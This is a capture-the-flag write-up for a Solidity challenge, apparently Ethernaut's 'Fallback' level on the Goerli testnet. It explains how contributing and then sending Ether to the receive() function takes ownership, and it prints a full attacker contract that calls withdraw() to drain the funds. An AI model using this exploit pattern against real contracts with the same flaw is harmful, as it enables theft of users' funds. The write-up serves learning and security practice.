Level 1
==========================================================================================================================================

Deployment transaction: https://goerli.etherscan.io/tx/0x3518fe01dfc4ee56725311f18f048eab90f7229a9375eb289335e5cebf6a7f86
Submission transaction: https://goerli.etherscan.io/tx/0xccc14269f191440a72a09ba47a71a7c4e77f6861f257f279516c8690231c5a49

-------
This challenge's task is to aquire contract ownership then withdraw all funds from it. 
The target contract does have a receive() function, an alternative to fallback functions that only gets executed when a contract receives Ether. 
To access the receive function, though, first we need to contribute to the contract. We do this by transfering any amount smaller than 0.001 Ether.
After that, we can push the attack, by sending any amount of ether. I opted to use the call low-level function, as it returns booleans upon succesfull transfers.
If it's successful, we go forward to the withdraw function call and finish the script.

#### Exploit contract:

```
    interface Fallback{
    function contribute() external payable;
    function getContribution() external view returns(uint);
    function withdraw () external;
}

contract fallbackAttack {
    address private target;

    constructor (address _target)  payable {
        target = _target;
    }

    function contribute() payable external {
        Fallback(target).contribute{value:  msg.value}();
        
    }

    function claimOwnership() payable external {
        (bool sent, bytes memory data) = target.call{value:  msg.value}("");
        require (sent, "E1");
  
        
    }

    function withdraw() payable external {
        Fallback(target).withdraw();
        
    }
}

```
[Claim ownership tx]('https://goerli.etherscan.io/tx/0xecfc69941b1241e7bb967b968b6ae03808826c38e9c1e38b705553ead4078687')

I spent over an hour debugging only to find out I spotted the receive function at the target's contract, but didn't actually implement any fallback function of my own. Lesson learned hahaha.


